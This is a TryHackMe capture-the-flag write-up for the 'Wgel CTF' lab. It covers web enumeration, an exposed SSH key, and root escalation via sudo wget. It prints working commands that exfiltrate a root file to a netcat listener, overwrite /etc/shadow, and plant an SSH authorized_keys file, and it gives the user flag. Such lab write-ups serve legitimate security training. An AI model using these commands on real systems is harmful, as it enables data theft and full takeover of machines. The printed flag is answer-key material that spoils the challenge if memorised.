---
title: 'Wgel CTF'
description: 'Enumeration and privilege escalation through wget with sudo permissions'
pubDate: 2023-09-14
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/8116d1d52d3a63dd1e7c2e7ddce8a0d5.png'
---

Feroxbuster finds the path `/sitemap/`.

Doing a dirbuster on `/sitemap` we find `sitemap/.ssh/id_rsa`

```bash
gobuster dir -u http://10.10.121.104/sitemap/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 50
...[snip]...
/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.121.104/sitemap/.ssh/]
...[snip]...
```

We have an SSH key but no username (yet).

On the source of the homepage there is a comment (`view-source:http://10.10.121.104/`).

```html
 <!-- Jessie don't forget to udate the webiste -->
```

## USER

```bash
ssh -i id_rsa.key jessie@10.10.121.104
```

The user flag is in `~/Documents/user_flag.txt` (`057c67131c3d5e42dd5cd3075b198ff6`).

## ROOT

Running `sudo -l` shows we can run `(root) NOPASSWD: /usr/bin/wget` as root.

Getting the root flag:

Local:
```bash
nc -lvnp 4444
```

Remote:
```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.8.119.137:4444
```

### Overwrite /etc/shadow

```bash
openssl passwd -6 -salt 'salt' 'password'
$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.
```

Copy this in the shadow file and overwrite the shadow file on the remote machine.

Local:
```bash
python3 -m http.server
```

Remote:
```bash
sudo /usr/bin/wget http://10.8.119.137:8000/shadow -O /etc/shadow
```

Switch to root:
```bash
su root # <-- password
```

## Create an authorized_keys file

Local:
```bash
python3 -m http.server
```

`authorized_keys` file:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaa6N4G/cwRAUJ6XzK+OAPPTrr7wbPRbvYcnm28bxuPsvPfzSb4lgCq7LfSVKnmMf9uFy9guwr5P3MR3MeaMoO1k3ZxiDAfDR0Np1JdYV/1baBzfFbr2+OQcsmz6VCLRsQm+qkJnWsUVKlXQ6NVhHFDgp8BrAGwIbqUDsY7u8tk9GIqw/LiWDZK1dBi5nRxS/HxSSGmDFbL8471x4w2id1TrWTIdp8qhsk/s/LlCcftw/+myv4nkz99UGgo9w9drvWYD9lSKiKYKEE9X+L/TNrQXNW4ll2dI+1LsvM+NgWrGeb8Edaj8uaWfgUvMtvVPfWk6hO1Mq5RBbEd/tw3y/p jessie@CorpOne
```

Remote:
```bash
sudo /usr/bin/wget http://10.8.119.137:8000/authorized_keys --directory-prefix=/root/.ssh/
```

Login as root:
```bash
ssh -i id_rsa.key root@10.10.121.104
```
